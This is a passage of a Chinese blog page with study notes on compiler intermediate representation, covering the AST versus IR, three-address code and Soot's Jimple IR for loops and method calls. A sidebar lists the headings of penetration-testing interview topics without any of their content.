<h2 id="Intermediate-Representation（IR）"><a href="#Intermediate-Representation（IR）" class="headerlink" title="Intermediate Representation（IR）"></a>Intermediate Representation（IR）</h2><h3 id="Compiler（编译器）"><a href="#Compiler（编译器）" class="headerlink" title="Compiler（编译器）"></a>Compiler（编译器）</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129151500527.png" alt="image-20240129151500527" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码 -&gt; Scanner(词法分析) -&gt; Tokens -&gt; Parser(语法分析) -&gt; AST -&gt; Type Checker(语义分析) -&gt; Decorated AST -&gt; Translator(后续优化) -&gt; IR&#123;静态分析&#125; -&gt; Code Generator -&gt; Machine Code</span><br></pre></td></tr></table></figure>

<h3 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs. IR"></a>AST vs. IR</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129153011938.png" alt="image-20240129153011938" style="zoom:67%;" />

<p><strong>AST</strong>：</p>
<ul>
<li>高级语法结构</li>
<li>通常依赖于语言</li>
<li>适用于快速类型检查</li>
<li>缺乏控制流信息</li>
</ul>
<p><strong>IR</strong>：</p>
<ul>
<li>低级且接近机器代码</li>
<li>通常与语言无关</li>
<li>紧凑均匀</li>
<li>包含控制流信息</li>
<li>通常被视为静态分析的基础</li>
</ul>
<h3 id="3-Address-Code（3AC）"><a href="#3-Address-Code（3AC）" class="headerlink" title="3-Address Code（3AC）"></a>3-Address Code（3AC）</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129153630416.png" alt="image-20240129153630416" style="zoom:67%;" />

<p>指令的右侧最多有一个运算符。</p>
<p>3地址可以是以下三种地址之一：</p>
<ul>
<li>Name（变量）</li>
<li>Constant（常量）</li>
<li>Compiler-generated remporary（编译器自动生成的临时变量）</li>
</ul>
<h3 id="常见的3AC表"><a href="#常见的3AC表" class="headerlink" title="常见的3AC表"></a>常见的3AC表</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129154003216.png" alt="image-20240129154003216" style="zoom:67%;" />

<ul>
<li>x, y, z：地址值</li>
<li>bop：二元运算符</li>
<li>uop：一元运算符（取反等）</li>
<li>L：程序跳转标签</li>
<li>rop：比较符号</li>
<li>goto L：无条件跳转</li>
<li>if … goto L：条件跳转</li>
</ul>
<h3 id="Soot-and-Its-IR：Jimple"><a href="#Soot-and-Its-IR：Jimple" class="headerlink" title="Soot and Its IR：Jimple"></a>Soot and Its IR：Jimple</h3><h4 id="For-Loop"><a href="#For-Loop" class="headerlink" title="For Loop"></a>For Loop</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129161514875.png" alt="image-20240129161514875" style="zoom:67%;" />

<h4 id="Do-While-Loop"><a href="#Do-While-Loop" class="headerlink" title="Do-While Loop"></a>Do-While Loop</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129162058436.png" alt="image-20240129162058436" style="zoom:67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129164459828.png" alt="image-20240129164459828" style="zoom:67%;" />

<ul>
<li>r0：命令行参数</li>
<li>r1：整型数组</li>
<li>i1：变量i</li>
<li>$i0：用于记录变量i值的临时变量</li>
</ul>
<h4 id="Method-Call"><a href="#Method-Call" class="headerlink" title="Method Call"></a>Method Call</h4><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240129170933371.png" alt="image-20240129170933371" style="zoom:67%;" />

<ul>
<li>首先前三行声明了一些变量和类型</li>
<li>将当前类所在的对象赋值给了r0（也就是this）</li>
<li>r1和r2分别拿到para1和para2的值</li>
<li>new了一个StringBuilder对象r3作为String处理的临时变量（java的语法特性）</li>
<li>specialinvoke：调用constructor、调用父类的方法、调用私有方法</li>
<li>然后通过三个append处理了三个字符串，toString转成字符串，然后return</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.y5neko.uk">Y5neKO</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.y5neko.uk/2024/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%88%86%E5%8C%BA%E5%9D%97%E6%80%BB%E7%BB%93/">https://blog.y5neko.uk/2024/08/09/渗透测试面试分区块总结/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.y5neko.uk" target="_blank">Y5neKO's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="/image/image-20230926215400707.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/03/%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8EJavaFX%E7%9A%84%E8%AE%B0%E5%BD%95/" title="一些关于JavaFX的记录"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/Pasted%20image%2020240503162825.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一些关于JavaFX的记录</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/20/Java%E5%AE%89%E5%85%A8/" title="Java安全基础"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20230808142318172.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java安全基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/25/IDA%20Pro%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="IDA Pro操作指南"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/Pasted%20image%2020240329103100.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-25</div><div class="title">IDA Pro操作指南</div></div></a></div><div><a href="/2023/03/06/Java%E5%9F%BA%E7%A1%80/" title="Java学习笔记"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20220429122054874.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-06</div><div class="title">Java学习笔记</div></div></a></div><div><a href="/2024/08/20/Java%E5%AE%89%E5%85%A8/" title="Java安全基础"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20230808142318172.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-20</div><div class="title">Java安全基础</div></div></a></div><div><a href="/2023/03/29/Linux%E8%BF%90%E7%BB%B4%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/" title="Linux运维疑难杂症"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/337b44cbd42152857ed44339a37e878c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-29</div><div class="title">Linux运维疑难杂症</div></div></a></div><div><a href="/2024/09/12/Nanocore%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/" title="Nanocore恶意程序分析"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20240912170857294.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-12</div><div class="title">Nanocore恶意程序分析</div></div></a></div><div><a href="/2024/12/09/msi%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/" title="MSI样本分析方法"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20241105145700564.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">MSI样本分析方法</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断域环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">找域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%99%A8%E5%BF%AB%E9%80%9F%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">扫描器快速扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%8E%B0%E6%9C%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.4.</span> <span class="toc-text">直接利用现有漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">永恒之蓝MS17-010</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SYSVOL%E6%BC%8F%E6%B4%9EMS14-025"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">SYSVOL漏洞MS14-025</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">tomcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jboss-manager"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">jboss manager</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">Java反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#searchsploit"><span class="toc-number">1.1.4.6.</span> <span class="toc-text">searchsploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.4.7.</span> <span class="toc-text">爆数据库连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxylogon"><span class="toc-number">1.1.4.8.</span> <span class="toc-text">proxylogon</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#winPEAS"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">winPEAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%90%AB%E6%9C%89%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E6%96%87%E6%A1%A3%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">查找含有关键字的文档文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83Rotten-Patato-MS16-075"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">烂土豆提权Rotten Patato  MS16-075</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E6%B1%81%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83Juicy-Potato"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">多汁土豆提权Juicy Potato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PrintSpoofer"><span class="toc-number">1.1.5.5.</span> <span class="toc-text">PrintSpoofer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RoguePotato"><span class="toc-number">1.1.5.6.</span> <span class="toc-text">RoguePotato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMBGhost-CVE-2020-0796"><span class="toc-number">1.1.5.7.</span> <span class="toc-text">SMBGhost  CVE-2020-0796</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeriousSAM-CVE-2021-36934"><span class="toc-number">1.1.5.8.</span> <span class="toc-text">SeriousSAM  CVE-2021-36934</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.6.</span> <span class="toc-text">本地管理员进一步提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#procdump-exe"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">procdump.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf-hashdump%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">msf hashdump模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrackMapExec"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">CrackMapExec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87LSA%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.7.</span> <span class="toc-text">绕过LSA读取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%AA%83%E5%8F%96"><span class="toc-number">1.1.8.</span> <span class="toc-text">token窃取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">本机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81Windows"><span class="toc-number">1.2.1.</span> <span class="toc-text">获取当前用户密码Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81Linux"><span class="toc-number">1.2.2.</span> <span class="toc-text">获取当前用户密码Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text">扩散信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见信息搜集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.3.2.</span> <span class="toc-text">域用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REPRoasting"><span class="toc-number">1.3.3.</span> <span class="toc-text">AS-REPRoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.4.</span> <span class="toc-text">密码喷洒攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">定位域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AdFind"><span class="toc-number">1.3.6.</span> <span class="toc-text">AdFind</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">打域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SYSVOL"><span class="toc-number">1.4.1.</span> <span class="toc-text">SYSVOL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">1.4.2.</span> <span class="toc-text">MS14_068</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.</span> <span class="toc-text">域委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.2.</span> <span class="toc-text">非约束委派+Spooler打印机服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.3.</span> <span class="toc-text">约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">委派流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E5%90%8E%E9%97%A8%EF%BC%89"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">利用（后门）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E6%A8%AA%E5%90%91%EF%BC%89"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">利用（横向）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.4.</span> <span class="toc-text">基于资源的约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E5%90%8E%E9%97%A8%EF%BC%89-1"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">利用（后门）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E6%A8%AA%E5%90%91%EF%BC%89-1"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">利用（横向）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">1.5.4.5.</span> <span class="toc-text">利用（提权）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">常见漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic"><span class="toc-number">2.1.</span> <span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CVE-2015-4852"><span class="toc-number">2.1.1.</span> <span class="toc-text">T3协议反序列化CVE-2015-4852</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson"><span class="toc-number">2.2.</span> <span class="toc-text">FastJson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E8%A7%A3%E6%9E%90"><span class="toc-number">2.2.1.</span> <span class="toc-text">正常解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E8%A7%A3%E6%9E%90%E7%B1%BB%E5%9E%8B%E4%B8%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.2.</span> <span class="toc-text">指定解析类型为对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E7%B1%BB"><span class="toc-number">2.2.3.</span> <span class="toc-text">根据字符串反序列化任意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.2.4.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.2.5.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">特点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-1"><span class="toc-number">2.2.6.</span> <span class="toc-text">FastJson&lt;1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl%E7%B1%BB-JNDI%E6%B3%A8%E5%85%A5%EF%BC%88%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">JdbcRowSetImpl类+JNDI注入（出网）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.6.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP"><span class="toc-number">2.2.6.1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">2.2.6.1.3.</span> <span class="toc-text">限制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">2.2.6.2.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">2.2.6.2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.6.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FastJsonBcel%E7%B1%BB-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">2.2.6.3.</span> <span class="toc-text">FastJsonBcel类+动态类加载（不出网）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">2.2.6.3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP-2"><span class="toc-number">2.2.6.3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-2"><span class="toc-number">2.2.7.</span> <span class="toc-text">FastJson&lt;&#x3D;1.2.47绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">2.2.7.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">2.2.7.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson1-2-25-1-2-41%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.8.</span> <span class="toc-text">FastJson1.2.25-1.2.41绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-4"><span class="toc-number">2.2.8.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson1-2-42%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.9.</span> <span class="toc-text">FastJson1.2.42绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson1-4-43%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.10.</span> <span class="toc-text">FastJson1.4.43绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.11.</span> <span class="toc-text">FastJson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FastJson-3"><span class="toc-number">2.2.11.1.</span> <span class="toc-text">FastJson&lt;&#x3D;1.2.48</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93-by-%E5%AF%92%E7%A5%9E"><span class="toc-number">2.2.12.</span> <span class="toc-text">fastjson面试总结 by 寒神</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat"><span class="toc-number">2.3.</span> <span class="toc-text">Tomcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j"><span class="toc-number">2.4.</span> <span class="toc-text">Log4j</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro"><span class="toc-number">2.5.</span> <span class="toc-text">Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">2.5.1.</span> <span class="toc-text">shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%99%BB%E5%BD%95"><span class="toc-number">2.5.1.2.1.</span> <span class="toc-text">普通登录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8B%BE%E9%80%89rememberMe%E7%99%BB%E5%BD%95%EF%BC%8C%E4%BA%A7%E7%94%9FrememberMe"><span class="toc-number">2.5.1.2.2.</span> <span class="toc-text">勾选rememberMe登录，产生rememberMe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rememberMe%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95"><span class="toc-number">2.5.1.2.3.</span> <span class="toc-text">rememberMe自动登录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.1.3.</span> <span 